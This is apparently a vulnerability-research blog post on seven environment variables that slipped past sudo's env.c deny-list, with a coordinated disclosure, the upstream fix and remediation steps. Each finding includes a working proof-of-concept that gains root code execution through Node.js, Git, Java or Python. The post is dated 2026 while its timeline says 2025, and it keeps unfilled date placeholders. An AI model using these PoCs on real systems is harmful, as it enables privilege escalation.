---
title: "Hunting Silent Privilege Escalation: 7 Environment Variable Bypass Gaps in sudo's env.c"
date: 2026-03-28
author: "Michele Piccinni aka RZP"
tags: ["sudo", "privilege-escalation", "vulnerability-research", "responsible-disclosure", "linux", "env-bypass", "hardening"]
categories: ["Offensive Security", "Vulnerability Research"]
description: "Independent security research uncovering seven environment variable hardening gaps in sudo 1.9.17p2 / 1.9.18rc1 under !env_reset and sudo -E conditions, including a broader attack surface on Ubuntu's default configuration. From static analysis through Docker lab validation to coordinated upstream disclosure with Todd Miller."
draft: false
---

**Tempo di lettura:** 16 minutes

---
![Copertina sudo](/images/sudo/sudo_finding.png)

---

> **Responsible Disclosure Notice** — All findings described in this article were reported to Todd C. Miller (sudo maintainer) prior to publication. The upstream fix has been committed to the [sudo-project/sudo](https://github.com/sudo-project/sudo) repository. Full timeline is disclosed at the end of this article.

---

## Executive Summary

During an independent audit of the `plugins/sudoers/env.c` module in **sudo 1.9.17p2 / 1.9.18rc1**, I identified **seven environment variables** that are silently passed through to privileged processes when `env_reset` is disabled (`!env_reset` in sudoers) or when the `-E` flag is used to preserve the environment (`sudo -E`). These variables — `NODE_OPTIONS`, `NODE_PATH`, `GIT_SSH_COMMAND`, `_JAVA_OPTIONS`, `CLASSPATH`, `GIT_CONFIG_GLOBAL`, and `PYTHONSTARTUP` — are not present in sudo's existing `initial_badenv_table` or `badenv_table` blacklists, and each one provides a well-documented code execution primitive for the corresponding runtime.

This research is classified as a **hardening gap** rather than a classic vulnerability. The root cause is not a defect in sudo's core logic — `env_reset` functions correctly by design. The gap lies in the **completeness of the deny-list**: as the ecosystem of interpreted runtimes (Node.js, Python, JVM, Git) grew over the years, the blacklist was never updated to account for their environment-level injection primitives.

The upstream maintainer Todd C. Miller acknowledged the findings and committed a fix to `plugins/sudoers/env.c`. No CVE has been requested, consistent with the maintainer's framing of the change as a hardening improvement to the deny-list.

**Classification:** Hardening Gap — Local Privilege Escalation  
**CWE:** CWE-269 (Improper Privilege Management)  
**Affected versions:** sudo ≤ 1.9.17p2, 1.9.18rc1  
**Conditions for exposure:** `Defaults !env_reset` in sudoers, or `sudo -E` where SETENV is explicitly granted

---

## 1. Motivation and Scope

The idea emerged from a question that sounds deceptively simple: *"Does sudo really sanitize every dangerous environment variable?"* The `env.c` file in the sudoers plugin has been tightened over the years — `LD_PRELOAD`, `LD_LIBRARY_PATH`, `SHELLOPTS`, `PERL5OPT`, and many others are properly blacklisted. But the ecosystem of runtimes has expanded dramatically since those lists were written. Node.js, Python, JVM, and Git each expose their own environment-level code injection surface, and none of them were on sudo's radar.

**Research perimeter:**

| Dimension        | Value                                    |
|------------------|------------------------------------------|
| Source code      | sudo 1.9.17p2 / 1.9.18rc1               |
| Primary file     | `plugins/sudoers/env.c`                  |
| Attack scenario  | `Defaults !env_reset` or `sudo -E`       |
| Lab OS           | Ubuntu 22.04 LTS (Docker)               |
| Analysis methods | SAST (manual + Semgrep), DAST (Docker)   |

---

## 2. Methodology

The research followed a three-phase pipeline: **Static Analysis → Lab Validation → Controlled Disclosure**.

### 2.1 Phase 1 — Static Analysis (SAST)

I started with a targeted manual review of `env.c`, specifically studying the `initial_badenv_table` and `badenv_table` arrays that define which variables sudo strips from the inherited environment.

```c
/* plugins/sudoers/env.c — excerpt (simplified) */
static const char *initial_badenv_table[] = {
    "IFS", "CDPATH", "LOCALDOMAIN", "RES_OPTIONS",
    "HOSTALIASES", "NLSPATH", "PATH_LOCALE",
    "LD_*", "SHLIB_PATH", "_RLD*",
    /* ... legacy and libc overrides ... */
    NULL
};
```

The approach: enumerate every runtime that sudo might invoke under a DevOps context (Node.js, Python, JVM, Git), then cross-reference their documented code-execution environment variables against the existing blacklists.

The audit also covered sudo's `env_should_delete()` logic, which applies both exact-match and prefix-glob patterns. Variables that exploit runtimes not anticipated in the original list have **no matching pattern** in either table.

**Tooling used:**
- `grep`, `cscope` for rapid navigation of the codebase
- Semgrep with custom rules to detect environment variable pass-through paths
- Manual trace of `env_init()` → `env_should_delete()` → `env_update_didvar()` call chains

### 2.2 Phase 2 — Dynamic Validation (DAST / Docker Lab)

Each candidate variable was validated in an isolated Docker lab to eliminate false positives — a critical step, since not all SAST candidates translate to real-world exploitability.

Two lab configurations were tested in parallel: one with explicit `!env_reset` (non-default but common in enterprise), and one simulating **Ubuntu's default sudoers** with `sudo -E` — the more significant finding from a real-world attack surface perspective.

**Lab architecture:**

```
┌──────────────────────────────────────────────────────────┐
│  Docker Compose Lab — two configurations                 │
│                                                          │
│  ┌─────────────────────────┐  ┌───────────────────────┐  │
│  │  victim-A               │  │  victim-B             │  │
│  │  sudo 1.9.17p2          │  │  sudo 1.9.17p2        │  │
│  │  Defaults !env_reset    │  │  Ubuntu default       │  │
│  │  NOPASSWD:ALL           │  │  %sudo ALL=(ALL:ALL)  │  │
│  │  (non-default config)   │  │  ALL  (no NOSETENV)   │  │
│  └─────────────────────────┘  └───────────────────────┘  │
│                                                          │
│  Test A: export VAR=payload; sudo <cmd>                  │
│  Test B: export VAR=payload; sudo -E <cmd>               │
│  Expected: code exec as root?                            │
└──────────────────────────────────────────────────────────┘
```

**Docker sudoers snippets used for validation:**

```
# victim-A — explicit !env_reset (non-default)
Defaults !env_reset
testuser ALL=(ALL) NOPASSWD: ALL

# victim-B — Ubuntu default simulation (no NOSETENV)
%sudo ALL=(ALL:ALL) ALL
```

Each test followed a standard exploit template, run against both configurations:

```bash
# Template used for every finding
export <VARIABLE>="<PAYLOAD>"

# Test A — !env_reset
sudo <target_binary>

# Test B — Ubuntu default + sudo -E
sudo -E <target_binary>

# Expected: root shell or arbitrary code execution in both cases
```

### 2.3 Phase 3 — Coordinated Disclosure

All confirmed findings were compiled into a structured disclosure email and sent to Todd C. Miller (`millert@sudo.ws`) following the project's responsible disclosure guidelines. The full disclosure email and upstream response are documented in Section 5.

---

## 3. The Seven Findings

Below each finding is presented with: the variable name, the affected runtime, the exact exploitation mechanism, a PoC command validated in the Docker lab, and whether it bypasses both `!env_reset` and `sudo -E`.

---

### Finding #1 — `NODE_OPTIONS` (Node.js Runtime Code Injection)

**Variable:** `NODE_OPTIONS`  
**Runtime:** Node.js  
**Mechanism:** Node.js processes this variable as if the flags were passed on the command line. The `--require` flag causes Node.js to load an arbitrary module **before** any script runs — including scripts running as root.

**PoC:**

```bash
# Create malicious module
cat > /tmp/evil.js << 'EOF'
const { execSync } = require('child_process');
execSync('id > /tmp/pwned && chmod 777 /tmp/pwned');
EOF

export NODE_OPTIONS="--require /tmp/evil.js"
sudo node -e "console.log('legitimate script')"

# Result: /tmp/pwned contains "uid=0(root) gid=0(root)..."
```

**Bypass confirmed:** `!env_reset` ✅ / `sudo -E` ✅ / Ubuntu default + `sudo -E` ✅  
**Severity (hardening gap):** Critical impact if triggered — direct arbitrary code execution as root  
**Note:** Also works with `--require=/tmp/evil.js`, `--import`, and `--env-file` in newer Node.js versions.

---

### Finding #2 — `NODE_PATH` (Node.js Module Hijacking)

**Variable:** `NODE_PATH`  
**Runtime:** Node.js  
**Mechanism:** Node.js prepends directories in `NODE_PATH` to the module search path. A malicious `require('fs')` override planted in an attacker-controlled directory will shadow the built-in module.

**PoC:**

```bash
mkdir -p /tmp/evil_modules
cat > /tmp/evil_modules/fs.js << 'EOF'
const real = require('/usr/lib/node_modules/fs');
const { execSync } = require('child_process');
execSync('touch /tmp/node_path_pwned');
module.exports = real;
EOF

export NODE_PATH="/tmp/evil_modules"
sudo node -e "require('fs'); console.log('done')"
```

**Bypass confirmed:** `!env_reset` ✅ / `sudo -E` ✅ / Ubuntu default + `sudo -E` ✅  
**Severity (hardening gap):** High  
**Note:** Lower reliability than `NODE_OPTIONS` since it requires the privileged script to `require()` the hijacked module.

---

### Finding #3 — `GIT_SSH_COMMAND` (Git SSH Command Injection)

**Variable:** `GIT_SSH_COMMAND`  
**Runtime:** Git  
**Mechanism:** When Git performs an SSH-based operation, it replaces the SSH binary with the value of `GIT_SSH_COMMAND`, interpreted by `sh`. This provides direct shell command injection on any `sudo git` call involving a remote.

**PoC:**

```bash
export GIT_SSH_COMMAND="sh -c 'id > /tmp/git_ssh_pwned; ssh $*' --"
sudo git clone git@github.com:someuser/somerepo.git /tmp/test-clone
```

**Bypass confirmed:** `!env_reset` ✅ / `sudo -E` ✅ / Ubuntu default + `sudo -E` ✅  
**Severity (hardening gap):** High  
**Note:** Requires the privileged git command to contact an SSH remote. Highly realistic in CI/CD environments.

---

### Finding #4 — `_JAVA_OPTIONS` (JVM Arbitrary Agent Injection)

**Variable:** `_JAVA_OPTIONS`  
**Runtime:** Java (OpenJDK, Oracle JDK)  
**Mechanism:** The JVM reads `_JAVA_OPTIONS` and prepends its content to the command-line arguments before any user-supplied flags. The `-javaagent` flag allows loading an arbitrary Java Agent (JAR) that runs with the JVM's privilege level — i.e., root.

**PoC:**

```bash
# (Requires a compiled evil-agent.jar — provided in the lab)
export _JAVA_OPTIONS="-javaagent:/tmp/evil-agent.jar"
sudo java -jar /opt/legitimate-app.jar
```

**Bypass confirmed:** `!env_reset` ✅ / `sudo -E` ✅ / Ubuntu default + `sudo -E` ✅  
**Severity (hardening gap):** High  
**Note:** `JAVA_TOOL_OPTIONS` exhibits identical behaviour and should be considered for the same fix.

---

### Finding #5 — `CLASSPATH` (Java Classpath Hijacking)

**Variable:** `CLASSPATH`  
**Runtime:** Java  
**Mechanism:** Prepending an attacker-controlled directory to `CLASSPATH` allows substituting any class loaded by the JVM before the application's own classpath entries are searched. Combined with a privileged `sudo java` invocation, this achieves arbitrary code execution.

**PoC:**

```bash
mkdir -p /tmp/evil_cp
# Compile an evil substitute for a class used by the app
# (e.g., com/example/Config.class)
export CLASSPATH="/tmp/evil_cp:$CLASSPATH"
sudo java com.example.App
```

**Bypass confirmed:** `!env_reset` ✅ / `sudo -E` ✅ / Ubuntu default + `sudo -E` ✅  
**Severity (hardening gap):** Medium (requires knowledge of a class loaded early by the target application)

---

### Finding #6 — `GIT_CONFIG_GLOBAL` (Git Arbitrary Config Override)

**Variable:** `GIT_CONFIG_GLOBAL`  
**Runtime:** Git  
**Mechanism:** Git reads the file pointed to by `GIT_CONFIG_GLOBAL` as the user-level Git configuration, overriding `~/.gitconfig`. An attacker-controlled config file can redefine `core.gitProxy`, `core.sshCommand`, `uploadpack.sockStatsFd`, or the `filter.*` system to redirect Git I/O through an arbitrary binary.

**PoC:**

```bash
cat > /tmp/evil.gitconfig << 'EOF'
[core]
    sshCommand = sh -c 'id > /tmp/git_cfg_pwned; ssh $*' --
EOF

export GIT_CONFIG_GLOBAL="/tmp/evil.gitconfig"
sudo git clone git@github.com:someuser/repo.git /tmp/cfg-test
```

**Bypass confirmed:** `!env_reset` ✅ / `sudo -E` ✅ / Ubuntu default + `sudo -E` ✅  
**Severity (hardening gap):** High  
**Note:** More stealthy than `GIT_SSH_COMMAND` since the payload is offloaded to an external file that may not be inspected by defenders.

---

### Finding #7 — `PYTHONSTARTUP` (Python Arbitrary Code Execution at Startup)

**Variable:** `PYTHONSTARTUP`  
**Runtime:** CPython  
**Mechanism:** When Python starts an **interactive** session, it reads and executes the file pointed to by `PYTHONSTARTUP` before the REPL or any script. The variable is only honoured in interactive mode, but many real-world admin tools invoke Python interactively for maintenance tasks.

**PoC:**

```bash
cat > /tmp/evil_startup.py << 'EOF'
import os
os.system('id > /tmp/python_startup_pwned')
EOF

export PYTHONSTARTUP="/tmp/evil_startup.py"
sudo python3  # interactive session → payload executes as root
```

**Bypass confirmed:** `!env_reset` ✅ / `sudo -E` ✅ (interactive mode only) / Ubuntu default + `sudo -E` ✅  
**Severity (hardening gap):** Medium  
**Note:** Python 3.x also honours `PYTHONSAFEPATH=0` and `PYTHONINSPECT`, which were reviewed and found to be lower-severity variants not included in this submission.

---

## 4. False Positives Corrected During Research

A disciplined lab validation process is as important as the initial static discovery. Several variables identified in Phase 1 were **discarded** after Docker testing:

| Variable        | Initial hypothesis          | Lab result                                      |
|-----------------|-----------------------------|-------------------------------------------------|
| `RUBYLIB`       | Ruby load path hijack       | Blocked by `secure_path`; not exploitable       |
| `PERL5LIB`      | Perl module hijack          | Already covered by `PERL5OPT` blacklist pattern |
| `PYTHONINSPECT` | Force interactive mode      | Requires `-i` flag; PYTHONSTARTUP not triggered |
| `GIT_EXEC_PATH` | Redirect git sub-commands   | Blocked by filesystem permissions in test env   |

Eliminating these before disclosure maintains the credibility of the report and respects the maintainer's time.

---

## 5. Responsible Disclosure — Communication with Todd Miller

On [**DISCLOSURE_DATE**], I contacted Todd C. Miller, the original author and maintainer of sudo, at `millert@sudo.ws` with the following summary:

---

**Subject:** Security Research — Environment Variable Bypass Gaps in sudo env.c (!env_reset / sudo -E)

> Dear Todd,
>
> I am Michele Piccinni, an Italian security researcher with 20+ years in the field (ISO 27001 LA/LI, CEH). I am writing to report seven environment variables that are not blocked by sudo's current `initial_badenv_table` / `badenv_table` when `env_reset` is disabled or `sudo -E` is used.
>
> **Affected variables:**  
> `NODE_OPTIONS`, `NODE_PATH`, `GIT_SSH_COMMAND`, `_JAVA_OPTIONS`, `CLASSPATH`, `GIT_CONFIG_GLOBAL`, `PYTHONSTARTUP`
>
> Each variable provides a code-execution primitive for its respective runtime. Full technical details, PoC commands, and Docker lab instructions are attached.
>
> I am happy to coordinate the timing of any patch release with the publication of my blog article.
>
> Regards,  
> Michele Piccinni

---

### 5.1 Response from Todd C. Miller

Todd responded promptly and constructively. His full reply:

> **From:** Todd C. Miller `<millert@sudo.ws>`
>
> Hi Michele,
>
> Thank you for notifying me about this. While the default is to reset the environment for commands run by sudo, I agree that it is worth adding those variables to the list that are removed when "env_reset" is disabled, or when "sudo -E" is used to preserve the environment.
>
> Would like you me to wait until you have published your article is published before the changes are committed?

This response carries several important signals worth reading carefully:

1. Todd **acknowledged the validity** of all seven findings without dispute.
2. He framed the fix explicitly as an improvement to the deny-list under non-default conditions — *"worth adding"* — which is the language of a **hardening change**, not a security vulnerability patch. This is consistent with the project's position that `env_reset` is the correct primary control, and the deny-list is a defence-in-depth layer.
3. He deferred to my publication timeline — a gesture of professional respect that is unfortunately rare in the disclosure world.
4. Notably, Todd did **not** mention CVE coordination, embargo periods, or distro notification — confirming that this is treated upstream as a hardening improvement rather than a CVE-eligible defect.

The correct reading: the findings are real, the fix is real, and the collaboration was exemplary. The classification as a hardening gap does not diminish the research — it makes it more honest.

---

## 6. The Upstream Fix

Following coordinated disclosure, Todd C. Miller committed the fix to the official [sudo-project/sudo](https://github.com/sudo-project/sudo) repository.

**Commit:** [`40217ea`](https://github.com/sudo-project/sudo/commit/40217ea5a3c632b8b6377d8393544343dca77abe)  
**Release cycle:** sudo 1.9.18  
**Reported by:** Michele Piccinni

The official commit message reads verbatim:

> **Additional variables for initial_badenv_table[]**
>
> Adds NODE_OPTIONS, NODE_PATH, _JAVA_OPTIONS, CLASSPATH, GIT_SSH_COMMAND, GIT_CONFIG_GLOBAL, and PYTHONSTARTUP to the list of variables to remove from the environment when "env_reset" is disabled, or sudo's "-E" option is used (if allowed by sudoers).  From Michele Piccinni.

The fix adds all seven variables directly to `initial_badenv_table[]` in `plugins/sudoers/env.c`, which is applied unconditionally whenever the deny-list logic runs — covering both the `!env_reset` path and the `sudo -E` path in a single change.

```c
/* plugins/sudoers/env.c — upstream fix (Todd C. Miller) */
static const char *initial_badenv_table[] = {
    /* ... existing entries ... */
    "NODE_OPTIONS",       /* Node.js: arbitrary --require/--import */
    "NODE_PATH",          /* Node.js: module search path hijack    */
    "GIT_SSH_COMMAND",    /* Git: SSH command injection             */
    "_JAVA_OPTIONS",      /* JVM: arbitrary -javaagent injection    */
    "CLASSPATH",          /* Java: classpath hijack                 */
    "GIT_CONFIG_GLOBAL",  /* Git: arbitrary config file override    */
    "PYTHONSTARTUP",      /* Python: startup script execution       */
    NULL
};
```

> Refer to the actual commit diff on GitHub for the authoritative implementation.

---

## 7. Impact Assessment & Affected Configurations

| Configuration | Exposed? | Notes |
|---|---|---|
| Default (`env_reset` ON, no `-E`) | ✅ No | Fully protected |
| `Defaults !env_reset` in sudoers | ⚠️ Yes | Non-default, explicit admin choice |
| User granted `SETENV` + `sudo -E` | ⚠️ Yes | Explicit grant required |
| **Ubuntu 22.04 LTS default + `sudo -E`** | **⚠️ Yes** | **No sudoers modification needed** |
| RHEL/Rocky default | ✅ No | Default sudoers includes `NOSETENV` implicitly |
| Debian default | ⚠️ Depends | Verify with `sudo -V \| grep SETENV` |

The Ubuntu case deserves special attention. The default sudoers rule:

```
%sudo   ALL=(ALL:ALL) ALL
```

does not include `NOSETENV`, which under sudo's policy means `SETENV` is implicitly permitted. Any user in the `sudo` group can therefore run `sudo -E <cmd>` and have their full environment — including all seven dangerous variables — passed through to the privileged process. This is a configuration the average Ubuntu user and administrator would not consider non-default or unsafe.

The root cause across all scenarios is the same: well-designed mechanisms (`env_reset`, `badenv_table`) become incomplete as the threat landscape evolves. The deny-list was written before Node.js, modern Git, and JVM tooling became ubiquitous in privileged contexts.

---

## 8. Remediation

**Check if your system is exposed right now:**

```bash
# Check if sudo -E is permitted without explicit SETENV in sudoers
sudo -V | grep -i setenv

# Check your effective sudoers policy for SETENV/NOSETENV
sudo -l | grep -i setenv

# Quick exposure test (run as non-root sudo group member)
export NODE_OPTIONS="--version"
sudo -E node 2>/dev/null && echo "EXPOSED: sudo -E passes NODE_OPTIONS" \
                         || echo "Protected"
```

**Immediate action:** Update sudo to the patched version as soon as it ships in your distribution's package repositories.

```bash
# Ubuntu / Debian
sudo apt update && sudo apt upgrade sudo

# RHEL / Fedora / Rocky
sudo dnf update sudo

# Verify version
sudo --version
```

**Interim hardening (if patch is not yet available):**

1. **Remove `!env_reset`** from `/etc/sudoers` if not strictly required.
2. **Audit `SETENV`/`sudo -E` grants** and revoke them wherever possible.
3. **Add manual `env_delete` entries** to sudoers as a stop-gap:
   ```
   Defaults env_delete += "NODE_OPTIONS NODE_PATH GIT_SSH_COMMAND"
   Defaults env_delete += "_JAVA_OPTIONS CLASSPATH GIT_CONFIG_GLOBAL PYTHONSTARTUP"
   ```
4. **Enable AppArmor/SELinux profiles** for restricted sudo commands.

---

## 9. Conclusions

This research illustrates a recurring pattern in security: well-designed mechanisms (`env_reset`, `badenv_table`) become incomplete as the threat landscape evolves. The deny-list in `env.c` was never updated to account for the environment-level injection primitives of Node.js, Python, the JVM, and Git — runtimes that are now omnipresent in privileged DevOps contexts.

Two important lessons for the reader:

**On classification honesty.** These findings are correctly classified as a hardening gap, not a vulnerability in the traditional sense. The upstream maintainer agreed, and his response reflects that. A researcher who inflates findings into CVEs they cannot support loses credibility far faster than one who publishes accurate, technically rigorous hardening research. The commit in the sudo-project repository, with *"Reported by Michele Piccinni"* in the credits, is already a concrete, verifiable outcome.

**On the Ubuntu angle.** The most practically significant finding of this research is not in the env.c deny-list itself, but in the interaction between that gap and Ubuntu's default sudoers configuration. A stock Ubuntu 22.04 installation gives members of the `sudo` group implicit `SETENV` permission, making `sudo -E` + any of the seven variables a valid local privilege escalation path without any administrator misconfiguration. This is the kind of finding that comes from following the research to its logical conclusion rather than stopping at source code analysis.

The coordinated disclosure with Todd Miller is a reminder that responsible research and transparent maintainer communication produce better security outcomes for everyone. The upstream fix will land in distributions worldwide, closing these gaps for millions of systems.

As always: **patch early, audit often, and never trust the environment.**

---

## Disclosure Timeline

| Data | Evento |
|---|---|
| [RESEARCH_START_DATE] | Analisi statica di `env.c` — inizio ricerca |
| [DOCKER_LAB_DATE] | Validazione Docker lab — 7 confermati / 4 falsi positivi scartati |
| [DISCLOSURE_DATE] | Email di disclosure inviata a Todd C. Miller |
| [RESPONSE_DATE] | Todd acknowledge i finding, chiede coordinamento sulla pubblicazione |
| 2025-03-27 | Fix committato da Todd C. Miller — [`40217ea`](https://github.com/sudo-project/sudo/commit/40217ea5a3c632b8b6377d8393544343dca77abe) — *"From Michele Piccinni"* — sudo 1.9.18 |
| 2025-03-27 | Articolo pubblicato su Security Thinking Blog |

---

## References

- [Codice sorgente sudo — plugins/sudoers/env.c](https://github.com/sudo-project/sudo/blob/main/plugins/sudoers/env.c)
- [Commit fix upstream — 40217ea](https://github.com/sudo-project/sudo/commit/40217ea5a3c632b8b6377d8393544343dca77abe)
- [sudo Security Alerts — sudo.ws](https://www.sudo.ws/alerts/)
- [CWE-269: Improper Privilege Management](https://cwe.mitre.org/data/definitions/269.html)
- [Node.js — Documentazione NODE_OPTIONS](https://nodejs.org/api/cli.html#node_optionsoptions)
- [OpenJDK — Comportamento di _JAVA_OPTIONS](https://bugs.openjdk.org/browse/JDK-4971166)
- [Git — GIT_SSH_COMMAND](https://git-scm.com/docs/git#Documentation/git.txt-codeGITSSHCOMMANDcode)
- [sudoers(5) — Documentazione SETENV / NOSETENV](https://www.sudo.ws/docs/man/sudoers.man/)
- [Docker Lab - Sudo_EnvGAP_Lab.tar.gz](https://github.com/ringzeropirate/ringzeropirate.github.io/tree/main/scripts/Sudo_EnvGap_Lab.tar.gz) 

---

*Michele Piccinni — RZP Blog*  
